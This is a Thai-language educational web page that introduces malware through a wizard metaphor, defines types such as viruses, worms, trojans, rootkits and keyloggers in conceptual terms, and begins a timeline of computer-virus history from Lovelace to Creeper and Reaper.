<head>
	<style>
 		body {
 			background-color:white;
 			color:#444444;
 			font-size:16;
 		}
 		pre {
 			overflow-x: auto;
 			white-space: pre-wrap;
 			word-wrap: break-word;
 			text-align: justify;
 			background-color:white;
 			color:#444444;
 			font-size:16;
 		}
 		table {
 			width: 80%;
 		}
	</style>
</head>
<body>
	<center>
		<table>
			<tr>
				<td>
					<h1 id=main>หน้าหลัก</h1><hr>
				</td>
			</tr>
			<tr>
				<td>
					<h3><a href='#Menu1'>00. ในโลกแห่งเวทย์มนต์ยุคปัจจุบันคุณคือใคร</a></h3>
					<h3><a href='#Menu2'>01. MALWARE คืออะไร ทำงานอย่างไร</a></h3>
					<h3><a href='#Menu3'>02. ประวัติไวรัสคอมพิวเตอร์</a></h3>
					<h3><a href='#Menu4'>03. ใครคือผู้สร้างไวรัส</a></h3>
					<h3><a href='#Menu5'>04. ซีโร่เดย์คืออะไร</a></h3>
					<h3><a href='#Menu6'>05. เรื่องยุทธการทางการทหารของไวรัสคอมพิวเตอร์</a></h3>
					<h3><a href='#Menu7'>06. การแบ่งลำดับไวรัสตามภาษาคอมพิวเตอร์</a></h3>
					<h3><a href='#Menu8'>07. VIRUS แพลตฟอร์มวินโดวส์</a></h3>
					<h3><a href='#Menu9'>08. ทำความเข้าใจไวรัส BATCH FILE</a></h3>
					<h3><a href='#Menu10'>08.01. ทำความเข้่าใจคำสั่ง BATCH FILE</a></h3>
					<h3><a href='#Menu11'>08.02. เริ่มทำความเข้าใจไวรัสแบบใกล้ตัวมากขึ้น</a></h3>
					<h3><a href='#Menu12'>09. ทำความเข้าใจ BOOT VIRUS</a></h3>
					<h3><a href='#Menu13'>10. ทำความเข้าใจ MACRO VIRUS</a></h3>
					<h3><a href='#Menu14'>11. ทำความเข้าใจ PROGRAM VIRUS</a></h3>

				</td>
			</tr>
		</table>
	</center>
	<hr><br>

	<center>
		<table>
			<tr>
				<td>
 					<h1 id='Menu1'>
00. ในโลกแห่งเวทย์มนต์ยุคปัจจุบันคุณคือใคร
					</h1>
				</td>
			</tr>
			<tr>
				<td>
					<pre>
	ยุคข้อมูลไร้สาย ณ ปัจจุบัน ไม่มีมนุษย์คนไหน...หรือน้อยมากที่จะไม่เคยสัมผัสโทรศัพท์มือถือหรือแม้แต่ คอมพิวเตอร์ แม้แต่ในที่ยากไร้ทุรกันดาล ก็ตามและนั้นเองคือโลกอีกใบที่ซ้อนทับเราอยู่ "โลกแห่งเวทย์ทางคอมพิวเตอร์" ใช่แล้ว เรากล่าวถึงโลกแห่งข้อมูลไม่ว่าจะเป็นไบนารี่ ศูนย์ และ หนึ่ง จนไปถึง เอกสาร ชื่อบุคคล เบอร์โทรศัพท์ หมายเลขประจำตัว วันเดือนปีเกิด และสิ่งที่กล่าวมาคือ "ข้อมูล; Data"  จนไปถึงคำสั่งหรือเวทย์มนต์ทางมายาหรือคอมพิวเตอร์ที่ใช้จัดการพวกมัน...กระทำให้อยู่ในการจัดเก็บที่ถูกต้อง จนไปถึงสื่อสารทางธุรกรรมและการสาธารณสุขเองก็ตาม ที่มากไปกว่านันคือ สิ่งที่ควบคุมและจัดการโลกมายานี้ให้มีชิวิตและเป็นโลกซ้อนทับเราคือ "ซอฟต์แวร์; Software" จนไปถึ่ง "คำสั่งหรือทางภาษาเวทย์มนต์ ; Exploit" ที่กล่าว คือ คำสั่ง ที่ไม่ใช่การ "เขียนโค้ด; Coding" แต่มันคือ คำสั่งหรือเวทย์มนต์อันมีจุดประสงค์ต่อระบบปฏิบัติการและเหมือนคำสั่งสาบแช่งหรือพรอันประเสริฐทางมายาคอมพิวเตอร์ ใช่แล้ว...ผู้ใช้หรือคนธรรมดา(เลือดสีโคลน) จะร่ายคาถาเหล่านี้ไม่เป็น และจะแบ่งแยกกันตามความชำนาญเวทย์ และจุดประสงค์หรือเจตนาของผู้ร่ายคาถาเหล่านั้นตามนี้
	1. Hacker  (พ่อมดชำนาญเวทย์) ผู้คุมกฎสูงสุดหรือผู้ชำนาญเวทย์ แน่แล้ว...เขาเหล่านั้นมีทักษะที่หาตัวจับยาก แบ่งแยก เป็นฝ่ายขาว และ ฝ่ายดำ ตามหมวกที่ส่วมใส่คือ "Black Hat" และ "White Hat" ส่วนพ่อมดที่คล้ายนกสองหัวหรือไม่แบ่งแยกฝ่ายและกระทำทั้งดีและชั่วสองอย่างพร้อมกัน นั้นคือ "Glay Hat; พ่อมดหมวกเทา"  ซึ่งพวกพ่อมดทั้งหลาย...ในบางครั้งก็ต่อสู้กันเอง ตามทักษะสูงสุดหรือคาถาเพราะตัวตนพ่อหมดคือ "ซี่โร่เดย์; Zero Day" นั้นคือคำสาปที่ไม่ว่าฝ่ายใดฝ่ายหนึ่งเจอเขาไปต้องแก้ไขและต้องจัดการให้ได้เพราะไม่มี "เกาะป้องกัน;Firewall" ใด หรือแม้แต่ "ทาสรับใช้; Antivirus" ใดๆ รับมือมันได้ และแน่นอนพ่อมดที่ดีต้องมี เครื่องมือ หรือของวิเศษครบมือ และมากมายหลากหลายอย่าง บางอย่างมีราคาหรือแลกเปลี่ยนมาด้วยวิธีใดๆ ก็ตาม รวมไปถึง "ไม้คทาวิเศษ; Computer" ที่มีขีดความสามารถตามทรัพย์สินของพ่อมดเหล่านั้นด้วย ที่สำคัญ...ของวิเศษหายากมักจะนำซึ่งชัยชนะเสมอ
	2. Cracker (หมอผีหรือผู้เสพความตาย) แน่นอนคนกลุ่มนี้ไม่ได้มีความชำนาญเวทย์ หรือไม่คฑาอาญาสิทธิ์ระดับสูง แต่พวกเข้าจะเขาจะเป็นกลุ่มคนหรือองค์กรใต้ดิน ที่คอยรับใช้พ่อมดอีกที และในบางครั้งเองเวทย์มนต์ศักดิ์สิทธิ์ของพ่อมดจะถูกถ่ายทอดสู่พวกเขาเหล่านั้นด้วย รวมถึงเครื่องมือที่พ่อมดสร้างขึ้นเพื่อให้ง่ายต่อการใช้งานด้านต่างๆ ในบางครั้งทุนทรัพย์ของคนกลุ่มนี้หรือความสามารถด้านซีโร่เดย์ยังไม่มากพอ ทำให้คนกลุ่มนี้เป็นเพียงด้านมืดหรือผู้เสพความตายที่มีหน้าที่รับหน้าเมื่อองค์กรหรือหน่วยงานถูกจับได้และพวกเขาเหล่านั้นก็เป็นเพียงฉากหน้าหรือตัวแทนที่ต้องรับโทษทัณฑ์ เมื่อกระทำผิดหรือแพะรับบาปนั้นเอง
	3. Script kiddie (พ่อมดฝึกหัด) มาถึงนักเรียนหรือพ่อมดฝึกหัด ใช่แล้ว! เรากำลังพูดถึง "แฮรี่พอรต์เตอร์" ในแบบฉบับของโลกไซเบอร์ พวกเขามีขีดความสามารถหรือทุนทรัพย์เพียงพ่อต่อยอดเข้าสู่โรงเรียนพ่อมด หรือ เป็นทายาทของพ่อมดนั้นเอง แน่ละ คนกลุ่มนี้พึ่งอาศัยแท็บเล็ต หรือ มือถือ เรียนรู้โลกไซเบอร์ รวมถึงในอนาคต ที่จะมีอุปกณ์ IoT แบบนี้มากมายและนี้คือกล่าวสำคัญที่ "พ่อมดฝึกหัด" ทั้งหลายจะเริ่ม เจาะลึกสู่แกนระบบ หรือ เรียนรู้คำสั่งเทอร์มินอล ต่างๆ เพื่อรู้ลึกสู่ ระบบยุคโบราณอย่างคอมพิวเตอร์ส่วนบุคคล จนก้าวเข้าสู่ยุคของ ควอนตั้มคอมพิวเตอร์ ในอนาคต จากที่พิมพ์เทอร์มินอล จะเป็นการพร้อมพ์ คำสั่งบนระบบปัญญาประดิษฐ์นั้นเอง
	4. User and Gamer (มนุษย์หรือเลือดสีโคลน) ใช่ มนุษย์ปุถุชน หรือเรียกง่ายว่า "เกมส์เมอร์และผู้ใช้งานทั่วไป;Gamer & User" ในกลุ่มนี้เห็นเรื่องของการร่ายเวทย์หรือต่อสู้กันบนไซเบอร์เป็นเรื่องไร้สาระ วันๆ ขอแค่เข้าโซเชียล ดู มอง สนุกกับการเสพมากกว่าเป็นผู้สร้างหรือผู้ทดลองคำสั่งเวทย์มนต์ อย่างมากก็แค่ทำสูตรโกง หรือ ใช้โปรแกรมโกงเกมส์ หรือ ซื้อขายและของแลกไอเท็มเกมส์เสียเป็นส่วนใหญ่ พ่อหนักๆ เข้าเล่นกากหรือเล่นแพ้ ก็จะหันหน้าสู่ดาร์กเว็ป หรือ "แคร็กเกอร์หมอผี" เพื่อโกงเกมส์หรือยอมเสียเงินเพื่อให้ได้ร่างอวตาลที่เทพหรือฟันแทงไม่เข้า และสิ่งแลกเปลี่ยนกับร่างอวตาล อมตะ คือ "ปีศาจแห่งโลกไซเบอร์ หรือ Malware" แถมติดตัวตามหลอกหลอน ปีศาจเหล่านี้ไม่ได้เข้าสิ่งร่างในเกมส์ แต่มันจะติดกับเครื่องคอมพิวเตอร์ของผู้ใช้หรือนักเล่นเกมส์ "ในโลกไม่มีของฟรี กฏการแลกเปลียนเป็นหลักการของจักรวาล" ฉนั้นเขาเหล่านั้นจะถูกขโมยเงิน หรือ รหัสผ่านเพื่อจะทำการเข้าสิงกี่ครั้งก็ได้ หรือ แม้แต่เปิดเครื่องเมื่อไหร่ ซอมบี้ในเครื่องจะรายงานกลับไปยังหมอผีเหล่านั้นว่าพร้อมออกรบแล้ว และจะทำการ DDOs หรือเป็นสมุนในการตีป้อมของเซอร์เวอร์ในประเทศต่างที่หมอผีเหล่านั้นขู่กรรโชกทรัพย์ แม้แต่ใช้เป็นเครื่องที่ขู่กรรโชกทรัพย์ทางโซเชียลเพื่อให้เป็นตัวแทนหรือแพะในการติดคุกแทนหมอผีอีกที
	5. User Error (ซอมบี้หรือผู้ถูกสาป) สุดท้ายจากเป็นคนธรรมดา แต่เดินในทางที่ดำมืด เขาเหล่านั้นจะไม่ได้เป็นหมอผี แต่ผู้ใช้หรือนักเล่นเกมส์ที่ชอบของเถื่อนจะกลายเป็นเพียงซอมบี้หรือสัมภเวสี เร่ร่อนที่เครื่องของพวกเขาจะใช้ในการขุดคริปโต หรือแม้แต่ระดมยิ่งเครื่อข่าย บางครั้งก็เต็มไปด้วย "บอทเน็ต;Botnet" ที่ฝั่งไว้เพื่อรอการเชื่อต่อเครื่อข่ายหรือโครงข่ายภายในครอบครัวและค่อยๆ กระจ่ายสู่องค์กร โดยที่บางครั้งเครื่องในบ้านหรือในองค์กร มิได้มีความผิดหรือกระทำการดำมืดติดตั้งของเถื่อนๆ ก็ตาม ความโชคร้านจะตกสู่พวกเขาด้วยเช่นกัน และเมื่อจุดจบมาถึง จะถูกกรรโชกทรัพย์ ด้วย "แรมซัมแวร์;Ransomware" หรือ "มัลแวร์เรียกค่าไถ่" จะใช้เครื่องของคุณในการแพร่เชื้อและเข้ารหัสข้อมูลในเครื่องคุณ และครอบครัว จนถึงภายในองค์กร เมื่อถึงวันนั้นอดีตภาพถ่ายความทรงจำในอดีต ภาพอัลบั้มครอบครัว ความทรงจำที่ดีในชีวิตคุณ จะเป็นเพียงอดีต อย่างไม่มีวันได้กลับมา หรือแม้กระทั้งงานที่เคยทำเก็บไว้ในองค์กร หรือ ความลับหรือ เอกสารสำคัญของหน่วยงานของคุณ หากคิดว่ามันมีค่ามากพอ จะต้องเสียเงินตามช่องทางที่ หมอผีเหล่านั้นบอกและโอนเงินจ่ายมันด้วยราคาแพงมากกว่ากว่าแค่ไอเท็มหรือราคาตัวละครในเกมส์ที่โกงมา ท้ายที่สุดคือความเสียใจและเสียรู้ เป็นแผลเป็นที่จะขยายใหญ่เมื่อเติบโตขึ้น "แม้ว่าคุณจะกลายเป็น Hacker ในอนาคตแต่คุณจะเจ็บเมื่อมองย้อนกลับมาพบความผิดพลาดในอดีต และคุณจะไม่มีวันเป็น White Hat ได้ ถ้ายังลืมความแค้นและความเจ็บปวดเหล่านั้น ยินดีตอนรับ (อนาคิน ข้าคือพ่อของเจ้า)"

					</pre>
					<br><a href=#main>กลับสู่หน้าหลัก</a>
				</td>
			</tr>
		</table>
	</center>
	<br>
	<center>
		<table>
			<tr>
				<td>
 					<h1 id='Menu2'>
01. Malware คืออะไร ทำงานอย่างไร
					</h1>
				</td>
			</tr>
			<tr>
				<td>
					<pre>
	ทุกวันนี้...คนมักเรียกสื่งที่พบหรืออาการของ Error ต่างสาเหตุ...มากจาก “ไวรัส” (ซวยอีกแล้วถูกกล่าวหา) จริงแล้วเราเรียก “เรียกไวรัสคอมพิวเตอร์” กันติดปากมาตั้งแต่พบไวรัสยุค DOS ในยุคนั้นยังไม่มีคำว่า “มัลแวร์; Malware” เพราะไวรัสคอมพิวเตอร์ยุคนั้นไม่ได้มีหลากหลายกลายพันธ์เช่นทุกๆ วันนี้
	มัลแวร์ แบ่งออกเป็นหลายชนิด...โดยจำกัดนิยามจากโปรแกรมไม่พึ่งประสงค์ รวมถึงโปรแกรมแฮกส์หรือแคร็ก ต่างๆ ด้วย (Antivirusเตื่อนหมด)
	1. Virus "คำสั่งที่สามารถเคลื่อนย้ายตัวเองและคัดลอกตัวเองโดยผ่านพาหะไม่สามารถติดเชื้อด้วยตัวมันเองได้ต้องมีพาหะนำโรค" (ไวรัสจะต้องอาศัยส่วนที่เรียกว่า "รันไทม์;Runtime" ในการทำงานการพาะติดเชื้อ) ทำไมเป็นชุดคำสั่งเพราะไวรัสส่วนใหญ่ในสมัยก่อนหรือปัจจุบันก็ตาม จะอาศัยภาษาเครื่อง หรือ ไบนารี่ของแอสเซมบลี หรือ สคริปต่างๆ ในโปแกรมทำการสำเนาตัวมันเองไปยังพาหะ ส่วนใหญ่จะเป็นเป็นแฟ้มคำสั่งต่าง แฟ้มสคริปที่รันคำสั่งได้ คำจำกัดความจะระบุการติดเชื้อไวรัสคล้ายๆ กับเชื่้อไวรัสในสิ่งมีชีวิต ที่ต้องมีพาหะนำโรคไปสู่อุปกรณ์หรือ ที่อยู่อาศัยอื่นๆ ต่อๆ ไป
	2. Worms "คำสั่งหรือแฟ้มคำสั่งที่สามารถเคลื่อนย้ายหรือจำลองตัวมันเองได้โดยไม่ต้องมีพาหะนำโรค หรือเรียกได้ว่าติดเชื้อโดยอัตโนมัติด้วยคำสั่งหรือชุดคำสั่งของหนอนโดยผู้ใช้งานไม่ต้องเรียกใช้หรือเจาะจงการรันมันขึ้นมาทำงาน " (หนอนคอมพิวเตอร์ไม่ต้องอาศัย "รันไทม์;Runtime" ในการเรียกใช้จากพาหะติดเชื้อ ในอดีตหนอนคอมพิวเตอร์ จะอาศัยการทำงานแบบอัตโนมัติของระบบปฏิบัติการหรือเครื่อข่ายก็ตามมันจะทำการสำเนาตัวมันเองโดยไม่ต้องมีการสั่งหรือ ต้องรอการสั่งการ เพราะหนอนจะนิยามตามรูปแบบของหนอนสิ่งมีชีวิตที่มันมีชีวิตได้ด้วยตัวมันเองไม่ต้องอาศัยพาหะนำโรค สั่งปัจจุบันพวกมันอาศัยคำสั่งของระบบปฏิบัติการที่ทำงานในส่วนของบูตอัปหรือเรียกชุดคำสั่งอัตโนมัติหรือ สคิวดู ต่างๆ เพื่อให้หนอนมีชีวิตหนอนเหล่านี้จะเกาะติดส่วนสตาร์ทอัปดังกล่าว หรือ แม้แต่ หนอนออโต้รัน ที่อาศัยคำสั่ง Autorun.INF เพื่อทำงานอัตโนมัติเมื่อมีการเสียบอุปกรณ์ USB หรือ แฟลชไดร์ฟ ในยุควินโดวส์ ME มันอาศัย Desktop.INI เพื่อทำงานอัตโนมัติเมื่อมีการเรียกโฟลเดอร์ติดเชื้อทำงาน หรือเก่ากว่านั้นในยุค Windows 95 มันอาศัย สคราฟไฟล์ .SCF เพื่อติดเชื้อ คล้ายๆ กลับ หนอนซ้อตคัต ในปัจจุบัน ที่อาศัย .LNK ทำการเคลื่อนย้ายตัวเองสู่เป้าหมายใน Windows 10 ถึง Windows 11 ยุคปัจจุบันเทคนิคนี้ก็ยังนิยมหลอกล่อผู้ใช้งานที่ยังไม่เข้าใจให้แพร่กระจ่ายหนอนอยู่นั้นเอง
	3. Trojan "โปรแกรมที่สามารถเคลื่อนย้ายจำลองตัวเองหรือมีพฤติกรรมโจมตีหลบซ่อนหรือรีโมทเครื่องเป้าหมาย โดยคำจำจัดความจะนิยามไปถึงคำสั่งที่มีขนาดใหญ่ หรือ บรรจุหนอนคอมพิวเตอร์ เข้าไปในตัวมันหรือแม้แต่ไวรัสเข้าไปในตัวของมัน คล้ายๆ กับม้าไม้เมืองทอย ที่เข้าตีเมืองจนแตกเมื่อนำเข้าสู่กำแพงเมืองนั้นเอง" คำจำกัดความของม้าโทรจัน ทำไมติดเชื้อได้ เพราะมันอาศัย Backdoor หรือประตูหลังเพื่อเรียกรหรือโหลดตัวมันเองเข้าสู่เครื่องเป้าหมาย หลักการนิยามไวรัสหรือหนอนหรือม้าโทรจันจะแยกตามนี้คือ
		3.1. ไวรัสสามารถติดเชื้อภายในหนอนคอมพิวเตอร์ได้ แต่หนอนคอมพิวเตอร์ไม่สามารถติดเชื้อในไวรัสคอมพิวเตอร์ได้ และไวรัสก็ติดเชื้อไปยังม้าโทรจันได้เช่นกัน แต่ม้าโทรจันไม่สามารถติดเชื้อในไวรัสคอมพิวเตอร์ได้แต่ม้าโทรจันจงใจบรรจุหนอนหรือไวรัสสู่ Payload ของม้าโทรจันได้ บางครั่งม้าโทรจันก็อาจติดเชื้อไวรัสคอมพิวเตอร์อื่นๆ แบบไม่จงใจก็ได้
		3.2. หนอนคอมพิวเตอร์ จะถูกบรรจุแบบจงใจไว้ภายใน Payload ของม้าโทรจันได้ แต่ไม่สามารถติดเชื้อสู่ม้าโทรจันได้เพราะไม่ใช่ไวรัสคอมพิวเตอร์ และม้าโทรจันไม่สามารถติดเชื้อภายในหนอนคอมพิวเตอร์ได้
		3.3 ม้าโทรจันจะเรียก Backdoor เพื่อโหลดตัวเองสู่เครื่องเป้าหมายเพื่อโหลดไวรัสรุ่นใหม่หรือ หนอนคอมพิวเตอร์รุ่นใหม่ มาสู่เครื่องเป้าหมายได้หรือแม้แต่อัปเดรตความสามารถของม้าโทรจันในรุ่นใหม่ๆ ได้
	4. Hack Tools "เครื่องมือที่ใช้ในการเขียนพัฒนามัลแวร์หรือเจาะระบบ แฮกทรูจะไม่ใช่การติดเชื้อหรือแพร่สู่เครื่องเป้าหมาย แบบการติดเชื้อ" แฮกทรูเครื่องมือทำการสร้างไวรัสหรือหนอนคอมพิวเตอร์หรือแม้แต่สร้างม้าโทรจันอีกที แฮกทรูจะมีเครื่องมือในการเจนเนอเรต โค้ดไวรัสหหรือหนอนคอมพิวเตอร์ หรือสร้างม้าโทรจันที่เรียกว่า "แรนซอมแวร์" หรือ "มัลแวร์เรียกค่าไถ่"  ซึ่งมัลแวร์ที่เจนเนอเรต ออกมาจะมีแพตเทิลซ้ำๆ หรือมีการคาดเดาได้จากแอนตี้ไวรัส สมัยก่อนโปรแกรมพวกนี้จะเรียกว่า "ไวรัสทรูคิต; Virus Toolkit" แต่ในปัจจุบันมันมีขีดความสามารถหนึ่้งที่เพิ่มเข้ามาคือ "การทำให้โค้ดยุ่งเหยิง; Obfuscate"  ซึ่งมันคือการเจนเนตโค้ดมัลแวร์ออกมาแบบให้อ่านหรือ Debuger ยุ่งยากหรือสับสน เพื่อให้ไวรัสหรือหนอนหรือม้าโทรจันมีโค้ดที่ไม่ซ้ำกันหรือตรวจสอบหน้าตาของมัลแวร์ไม่ออก คล้ายๆ การ "โพลีมอฟิก;Polymofic" หรือการเข้ารหัส แต่การออฟฟัตเคต จะทำให้โค้ดที่เป็นภาษาสคริปหรือภาษาอังกฤษอ่านไม่ออกด้วยไวยากรณ์หรือสำเนียงหรือภาษาต่างจากมนุษย์จะเข้าใจ ถ้าเป็น Binary Code วิธิการนี้เรียกโพลีมอฟิก แต่ ออฟฟัตเคตในไบนารี่จะต่างออกไป คือ จะจั้มฟ์เส้นทางหรือ เพิ่มการหลอกล่อดีบักเกอร์เข้าไปด้วย (เหมือนไวรัสที่โพลีมอฟิกและสเติลท์ ผสมพันธ์กันนั้นเอง) แฮกทรูจะมีขนาดที่ใหญ่กว่าม้าโทรจันเพราะโดยทั่้วไปจะถูก Setup หรือ Install ติดตั้งลงในเครื่องเวริมเมอร์ หรือ นักเจาะระบบ เพื่อพัฒนาตัวมัลแวร์ใหม่ๆ ออกมา
	5. Spyware จัดเป็นมัลแวร์ประเภทการดักฟังหรือสืบค้นหรือ เจตนาหวังผลทางการค้า ตัวมัลแวร์ประเภทนี้ไม่จัดอยู่ใน ม้าโทรจันเพราะ มันมีพฤติกรรมที่หวังผลชัดเจนกว่า และไม่จัดอยู่ใน Keylogger เพราะ มันไม่ได้อาศัยการฮุกต์เข้าระบบหรือดักรอสถานะการณ์เหมือนคีย์ล็อกเกอร์ ทั้งสองอย่างที่กล่าวมาผู้เขียนไม่แน่ใจว่าทำไม่ เข้าถึงไม่ระบุอยู่ในประเภทหรือหมวดหมู่ของม้าโทรจัน แต่เขาน่าจะนิยามออกมาเพื่อให้ชัดเจนทางด้านจุดประสงค์ของมัลแวร์ตัวนี้ที่มีเจตนาทางด้านธุรกิจเสียเป็นส่วนใหญ่
	6. Adware โปรแกรมหรือโฆษณาทางการค้าที่ไม่พึงประสงค์ที่อาศัยช่องทางสื่อสารในการแอบและ หลบซ่อนในระบบของบาวน์เซอร์เพื่อฝังคำสั่งโฆษณาหรือจุดประสงค์ทางการค้าเช่นการคลิ๊กหรือยอดติดตามทางโซเชียลมิเดียโดยส่วนใหญ่เป็นโฆษณาสิ่งผิดกฏหมายเป็นต้น (บางค้นเรียก "ไวรัสโฆษณา")
	7. Rootkit โปรแกรมที่ฝังอยู่ในระบบชั้นล่างสุดและแกนระบบเพื่อล็อกหรือปกปิดลิขสิทธิ์บางอย่างจากผู้ไม่พึ่งประสงค์หรือ แม้แต่หวังผลในการโจมตีเครื่องผู้ใช้งานจนถึงระบบเครื่อข่าย รูทคิตจัดเป็นมัลแวร์ที่มีต้นตระกูลก่อกำเนิดมาจากไวรัสบูตเซคเตอร์หรือพาร์ทิชั่นไวรัส เพราะเป็นส่วนล่างสุดของระบบปฏิบัติการคอมพิวเตอร์ แต่ในปัจจุบันมันไปไกลมากกว่าที่คิด เพราะมันผนวกตัวมันเองเป็นส่วนหนึ่งของ "เฟริมแวร์หรือแม้แต่แกนระบบของโอเอส" มันซับซ้อนกว่าที่ช่างซ่อมคอมพิวเตอร์หรือผู้ใช้งานทั่วไปหรือแม้แต่แอนตี้ไวรัสธรรมดาจะกำจัดมันออกแบบมาเพื่ออยู่ส่วนที่ลึกที่สุดและกำจัดได้ยากที่สุด ถ้าเราไม่เข้าใจการทำงานของ BIOS หรือระบบปฏิบัติการในส่วนของ Boot Loader จะไม่สามารถทำความเข้าใจในส่วนนี้ได้มัลแวร์ตัวนี้ถ้าถูกพบโดยแอนตี้ไวรัสนับว่าโชคดีมาก (ส่วนใหญ่ไม่พบ) เพราะมันเป็นส่วนที่งานก่อนที่ระบบปฏิบัติการทำงานหรือแอนตี้ไวรัสที่อยู่ชั้นบนจะรู้ตัว... มันเคลื่อนย้ายหัวอ่านและค่าซิกแนเจอร์ทั้งหมดเกลี้ยง...รวมถึงอาศัยในหน่วยความจำชั้นสูง แม้แต่นักพัฒนาเกมส์หรือโปรแกรมลิขสิทธิ์ราคาแพงๆ หลายตัว จะทำงานในส่วนนี้เพื่อป้องการการโกงต่างๆ หรือการคัดลอกซอฟต์แวร์อย่างผิดลิขสิทธ์ต่างๆ แต่ที่น่ากลัวคือเป็นหนึ่งในอาวุธสังหารของแฮกเกอร์มือดีร่วมถึงเป็นช่องทางของสงครามไซเบอร์และอาวุธไซเบอร์ในอนาคต
	8. HOAX "โปรแกรมก่อกวน หรือ ตลกฟืด หรือ หลอกล่วงว่าเป็นโปรแกรมหรือคำสั่งอันตรายต้องส่งต่อเป็นลูกโซ่" นับเป็นมัลแวร์ที่กระจอกที่สุดในบรรดามัลแวร์ เพราะนี่เป็นเพียงข้อความขู่ หรือ ตลกร้ายของการส่งต่อข้อความทางโซเชียลหรือ ส่งมาทางอิเมล์ไม่ได้มีผลต่ออุปกรณ์คอมพิวเตอร์นอกเสียจากสร้างความรำคาญ
	9. Keylogger เป็นซอฟต์แวร์ (กล่าวถึ่งซอฟต์แวร์ไม่รวมตัวที่เป็นอุปกรณ์ไว้เสียบ USB) คีย์ล็อกเกอร์คือมัลแวร์ที่ดักจับคีย์บอร์ตคอมพิวเตอร์เก็บไว้นใน Log File หรือแม้แต่ส่งผ่านข่องทางสื่อสารอื่นๆ หวังผลในการดักฟัง ดักจับการสนธนาหรือแชต ต่างๆ หรือ ที่สำคัญคือ รอหรือดักจับรหัสผ่านที่ใช้งานไม่ว่าจะเป็น รหัสผ่านโปรแกรมอะไรก็ตาม ส่วนใหญ่จะเป็นส่วนย่อยของมัลแวล์หรือม้าโทรจันต่างๆ

					</pre>
					<br><a href=#main>กลับสู่หน้าหลัก</a>
				</td>
			</tr>
		</table>
	</center>
	<br>
	<center>
		<table>
			<tr>
				<td>
 					<h1 id='Menu3'>
02. ประวัติไวรัสคอมพิวเตอร์
					</h1>
				</td>
			</tr>
			<tr>
				<td>
					<pre>
	* 2358-2395: (Lady Augusta Ada Byron, Coutress of Lovelace ) โปรแกรมเมอร์คนแรกของโลกเธอบรรจงถักทอผ้าผ่านโปรแกรมคำสั่งคอมพิวเตอร์ด้วยลายผ้าอันวิจิตรงดงาม...คงนึกไม่ถึงว่า...ลายผ้าสมัยนี้...จะน่ากลัวสักเพียงใดหากไวรัสคอมพิวเตอร์ปรากฎอยู่บนพื้นผ้าของเธอในสมัยนั้นด้วย
	* 2488: วันหนึ่ง Rear Admiral Grace Murray Hopper พยายามสั่งให้คอมพิวเตอร์ทำงาน แต่ทำยังไงมันก็ไม่ยอมทำงาน เธอจึงเข้าไปดูในฮาร์ดแวร์ ก็เจอผีเสื้อกลางคืนติดอยู่ในนั้น ซึ่งเธอเรียกมันว่า "bug" ซึ่งคำนี้ได้ใช้กันมาจนถึงปลายศตวรรษที่ 19 ซึ่งหมายถึงปัญหาที่เกิดขึ้นกับอุปกรณ์อิเล็คโทรนิคต่างๆ Murray Hopper ก็ยังได้สร้างคำขึ้นมาใหม่อีกคำหนึ่งคือ "debugging" ซึ่งได้อธิบายถึงความพยายามที่จะแก้ปัญหาที่เกิดขึ้นกับcomputer
	* 2492: นักวิทยาศาสตร์ชาว Hungarian ที่ชื่อว่า John von Neumann ได้คิดค้นทฤษฎีของโปรแกรมที่สามารถทำซ้ำตัวเองได้ ซึ่งพื้นฐานของโปรแกรมนี้เกี่ยวกับการใช้หน่วยความจำของเครื่องนั่นเอง ในหนังสือชื่อ "Theory of Self-Reproducing Automata" ในหนังสือของเขา ปี 2509 (หลังการทดสอบ Darwin หรือโปรแกรมสงครามหน่วยความจำ) และยังไม่เป็นที่แน่ชัดว่า หลักการด้านไวรัส หรือโปรแกรม "Darwin" ใครมาก่อนกัน แต่ตอนนั้นยังไม่มีการนิยามโปรแกรมจำพวกนี้ว่า "ไวรัสคอมพิวเตอร์" เพราะ "เครื่องคอมพิวเตอร์ส่วนบุคคล" ยังไม่ถือกำเนิดขึ้น อีกอย่างข้อมูลในสมัยนั้นยังใช้บัตรเจาะรูเป็นสื่อบรรทึกข้อมูล...และเทปบันทึกข้อมูล...แต่ขอให้รู้ว่า..."ไวรัสอยู่ในความคิดคนเรามานานแล้ว"
	* 2505: ทีมวิศวกรของ Bell Telephone Laboratories ได้สร้างเกมชื่อว่า "Darwin" (ในหนังสือของไทยสมัยก่อนเรียกโปรแกรมนี้ว่า "สงครามหน่วยความจำ") ถือเป็นโปรแกรมคอมพิวเตอร์ตัวแรกที่มีรูปแบบของไวรัส โดยฝังตัวอยู่ในหน่วยความจำ เกมนี้ใช้คำศัพท์บางอย่างที่มีคำว่า "supervisor" มีลักษณะที่กำหนดกฎเกณฑ์การต่อสู้ระหว่างผู้เข้าแข่งขัน โปรแกรม Darwin นี้มีความสามารถที่จะวิจัยสภาพแวดล้อมของมัน ทำสำเนา และทำลายตัวเองได้ จุดประสงค์หลักของเกมนี้ก็คือลบโปรแกรมทั้งหมดที่คู่แข่งเขียนและครอบครองสนามรบ
	* 2513:Bob Thomas (บางแหล่งข่าวอ้างว่าเป็นไวรัสตัวแรกของโลก) สร้างไวรัสที่มีลักษณะทางกายภาพขึ้นมา ในเครื่องของหน่วยงานที่เชื่อต่อ ARPANET ถือเป็นต้นแบบไวรัสคอมพิวเตอร์ในปัจจุบัน โปรแกรม Creeper สามารถเข้าครอบครองเครือข่ายผ่านโมเด็มและส่งสำเนาตัวเองไปที่ฝั่ง Remote ไวรัสนี้ทำให้คนรู้ว่าติดไวรัสด้วยการ broadcast ข้อความ "I'M THE CREEPER ... CATCH ME IF YOU CAN" โปรแกรมสามารถออนไลน์ได้อย่างอิสระผ่านโมเด็มและบันทึกสำเนาไว้ในเครื่องระยะไกล โดยรวมแล้วไวรัสไม่เป็นอันตราย แต่เจ้าหน้าที่ก็รู้สึกหงุดหงิด จากนั้น Ray Tomlinson เป็นผู้เขียน Antivirus ตัวแรกของโลก ชื่อ "Reaper" (เข้าเป็นเพื่อนรวมงานของ Bob Tomas นั้นเอง) โปรแกรมนี้จะทำการ สแกนหาและลบอินสแตนซ์ใดๆ ของ Creeper ที่พบที่นั่น ในข่าย ARPANET เพื่อไวรัส Creeper อีกที
 (เสริม) ปีนี้มีนิยายเรื่องแรกที่เขียนเกี่ยวกับไวรัสคอมพิวเตอร์คือ The Scarred Man โดย Gregory Benford
	* 2514 : ระบบ LDA , ทดลองโปรแกรมทำสำเนาตัวเองถูกเขียนโดยบ๊อบโทมัสที่ BBN เทคโนโลยีเพื่อทดสอบทฤษฎีจอห์นฟอนนอยมันน์
